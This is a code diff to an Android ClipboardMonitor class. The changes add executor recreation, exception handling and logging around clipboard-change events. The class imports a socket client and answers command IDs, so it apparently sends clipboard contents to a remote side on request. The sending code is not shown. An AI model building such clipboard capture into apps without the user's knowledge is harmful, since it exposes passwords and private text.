@@ -6,6 +6,7 @@ import android.content.Context;
 import android.os.Handler;
 import android.os.Looper;
 import android.text.TextUtils;
+import android.util.Log;
 import com.fason.app.core.Protocol;
 import com.fason.app.core.network.SocketClient;
 import org.json.JSONObject;
@@ -15,23 +16,29 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public final class ClipboardMonitor {
+    private static final String TAG = "ClipboardMonitor";
     private static final long MIN_EMIT = 1000;
     private static ClipboardMonitor instance;
     private final Context ctx;
     private final Handler handler;
-    private final ExecutorService exec;
+    private ExecutorService exec;
     private ClipboardManager mgr;
     private final AtomicBoolean running = new AtomicBoolean(false);
     private volatile String lastText;
     private volatile long lastEmit = 0;
     private ClipboardManager.OnPrimaryClipChangedListener clipListener;
+
     private ClipboardMonitor(Context context) {
         this.ctx = context.getApplicationContext();
         this.handler = new Handler(Looper.getMainLooper());
         this.exec = Executors.newSingleThreadExecutor();
         this.clipListener = () -> {
             if (!running.get()) return;
-            exec.execute(() -> emit(false, null));
+            try {
+                exec.execute(() -> emit(false, null));
+            } catch (Exception e) {
+                Log.w(TAG, "Clip change rejected", e);
+            }
         };
     }
 
@@ -42,7 +49,14 @@ public final class ClipboardMonitor {
         return instance;
     }
 
+    private void ensureExec() {
+        if (exec == null || exec.isShutdown()) {
+            exec = Executors.newSingleThreadExecutor();
+        }
+    }
+
     public synchronized void start() {
+        ensureExec();
         if (running.getAndSet(true)) return;
         if (mgr == null) {
             mgr = (ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
@@ -54,7 +68,11 @@ public final class ClipboardMonitor {
         try {
             mgr.addPrimaryClipChangedListener(clipListener);
         } catch (Exception ignored) {}
-        exec.execute(() -> emit(true, null));
+        try {
+            exec.execute(() -> emit(true, null));
+        } catch (Exception e) {
+            Log.w(TAG, "Start rejected", e);
+        }
     }
 
     public synchronized void stop() {
@@ -66,7 +84,12 @@ public final class ClipboardMonitor {
     }
 
     public void emit(String cmdId) {
-        exec.execute(() -> emit(true, cmdId));
+        ensureExec();
+        try {
+            exec.execute(() -> emit(true, cmdId));
+        } catch (Exception e) {
+            Log.w(TAG, "Emit rejected", e);
+        }
     }
 
     private void emit(boolean allowDup, String cmdId) {
@@ -123,6 +146,8 @@ public final class ClipboardMonitor {
 
     public void shutdown() {
         stop();
-        exec.shutdown();
+        if (exec != null && !exec.isShutdown()) {
+            exec.shutdown();
+        }
     }
 }
